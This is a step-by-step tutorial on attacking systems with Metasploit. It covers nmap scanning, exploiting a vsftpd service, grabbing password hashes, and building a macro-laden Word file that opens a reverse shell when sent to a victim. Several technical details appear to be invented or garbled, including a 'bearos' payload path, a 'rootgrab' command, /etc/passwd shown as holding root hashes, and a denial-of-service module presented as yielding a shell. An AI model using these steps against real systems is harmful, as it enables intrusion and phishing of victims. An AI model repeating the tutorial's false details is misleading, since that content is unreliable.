**Introduction to Metasploit**

Metasploit is a penetration testing tool used to detect and test security vulnerabilities.

It is used by ethical hackers and cybersecurity professionals to identify weaknesses in systems and improve defenses.

However, it can also be used by malicious actors for attacks, so it should be used carefully and within legal boundaries.

**Installation**

```
apt-get install metasploit
```

**Usage**

```
msfconsole
```

**How to Hack with Metasploit?**

Metasploit is divided into exploits. Although the usage of each exploit is different, it works in more or less the same way.

We cannot use Metasploit alone, we need to use some tools along with it.

For example, we need to use **nmap** to learn which services are running on the system we want to infiltrate, which ports are active.

According to the results we found, if a port is open and we know the running version, we can usually infiltrate this system.

Let's get started.

**Scanning the Target**

For example, let's say our target's IP address is **11.22.33.44**.

We should start our hack by scanning the target first.

```
nmap 11.22.33.44 -sV
```

The result we got:

| PORT | STATE | SERVICE | VERSION | DESTINATION |
|------|-------|---------|---------|-------------|
| 21 | OPEN | ftp | vsftpd 2.3.5 | 192.168.1.2 |
| 22 | CLOSE | ssh | openssh 1.8.6 | 192.168.1.2 |
| 80 | CLOSE | http | nginx 7.23.4 | 192.168.1.2 |

From here we understand that port 21 is open and the service running in the background is **"vsftpd version 2.3.5"**.

Now we can start using metasploit.

```
msfconsole
```

**Searching Exploit**

We know that our target has an open port and a running service. Next, we need to find an exploit that fits it.

```
search [running service name]
```

**"vsftpd 2.3.5"** was running on our target port.

We need to look for a suitable exploit for vsftpd.

```
search vsftpd
```

| # | Name | Disclosure Date | Rank | Description |
|---|------|-----------------|------|-------------|
| 0 | auxiliary/dos/ftp/vsftpd | 2020-02-03 | normal | VSFTPD Denial of Service |

We found a usable exploit. We need to test it.

In order to use the exploit we found after searching, we need to use the **"use"** command.

```
use [exploit name or index]
```

For this example

```
use 0
```

Or

```
use auxiliary/dos/ftp/vsftpd
```

**Making Configurations**

We found our exploit and used it with the **"use"** command.

Now we need to configure the module we are using.

```
show options
```

After using this command we displayed the current settings of the module.

| Name | Current Settings | Required | Description |
|------|------------------|----------|-------------|
| RHOST | | yes | The target host |
| RPORT | 21 | yes | The target host |
| Version | 1.0.0 | yes | The target host |

We must fill in the fields with Required = **"yes"**

We fill these fields with the **"set"** command.

```
set RHOST 11.22.33.44
```

```
set Version 2.3.5
```

Note: Some fields may be filled by default, you should replace them with information about your target.

Once you have filled in all the required fields you can start the attack.

**Attacking**

Now that we have made all the settings, we can start the attack.

Usually this command is **"exploit"**. However, sometimes there may be other commands. You can learn by typing "help".

```
exploit
```

If everything is correct you will have infiltrated the system and metasploit will give you a **meterpreter** session.

**Rootgrab**

This metasploit tool get root password hash from passwd file.

Usage (In meterpreter)

```
rootgrab /path/to/passwd
```

Example

```
rootgrab /etc/passwd
```

Hint Usually the passwd file is located under /etc.

**Metasploit Payloads**

You can add payloads to some Metasploit exploits. These payloads are code scripts that will run on the target system.

The most well-known is

```
bearos/meterpreter/reverse_tcp
```

Usage

```
set payload <payload name>
```

Example

```
set payload bearos/meterpreter/reverse_tcp
```

**Metasploit Reverse TCP**

In some cases, most of the paths to the target system are closed, and we can't access them with our attacks. However, the target can open a way for us to enter, called Reverse TCP.

The most common way to deceive someone is through files. Seemingly harmless Word documents can carry malware that doesn't appear to be hidden.

The exploit we will use here is

```
exploit/multi/fileformat/office_word_macro
```

Usage

```
search office_word_macro
```

```
use exploit/multi/fileformat/office_word_macro
```

```
set payload bearos/meterpreter/reverse_tcp
```

```
show options
```

```
set LHOST 192.168.1.2
```

```
set LPORT 4444
```

```
run
```

```
handler
```

- Send file to target

When the connection comes

- With *Ctrl+C* exit handler.

```
show sessions
```

```
session <session index>
```

**Important**

Here, we've set the payload's LPORT (i.e., local port) to 4444. You can set this to any port you like. However, remember, you must open this port from the modem interface of the network you're connected to. Otherwise, the payload won't work.